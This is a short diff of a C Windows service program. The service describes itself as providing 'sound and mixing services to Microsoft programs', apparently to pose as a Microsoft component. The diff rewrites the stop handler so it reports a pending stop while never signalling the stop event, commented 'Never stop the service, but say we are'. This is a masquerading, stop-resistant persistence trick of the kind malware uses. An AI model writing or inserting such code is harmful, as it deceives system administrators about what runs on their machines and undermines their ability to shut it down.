@@ -40,7 +40,7 @@ int main(int argc, char **argv)
 	schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_CHANGE_CONFIG);
 	sd.lpDescription = TEXT("Provides sound and mixing services to Microsoft programs");
 
-	ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);
+	ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd); // Assign service description
 
 	CloseServiceHandle(schService);
 	CloseServiceHandle(schSCManager);
@@ -111,8 +111,8 @@ DWORD WINAPI HandlerEx(DWORD control, DWORD eventType, void *eventData, void *co
         // continue...
     // Service is being stopped.
     case SERVICE_CONTROL_STOP:
-        ReportStatus(SERVICE_STOP_PENDING);
-        SetEvent(g_StopEvent);
+        ReportStatus(SERVICE_STOP_PENDING); // Never stop the service, but say we are..
+        //SetEvent(g_StopEvent); 
         break;
     // Ignoring all other events, but we must always report service status.
     default:
